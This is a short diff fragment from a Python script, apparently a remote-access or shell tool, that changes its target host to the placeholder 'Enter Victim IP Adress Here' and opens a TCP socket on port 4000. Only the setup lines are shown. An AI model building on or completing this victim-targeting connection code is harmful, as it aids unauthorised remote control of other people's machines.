@@ -4,7 +4,7 @@ import subprocess,socket
 import os
 import time
 import base64
-HOST = '192.168.1.3'
+HOST = 'Enter Victim IP Adress Here'
 PORT = 4000
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
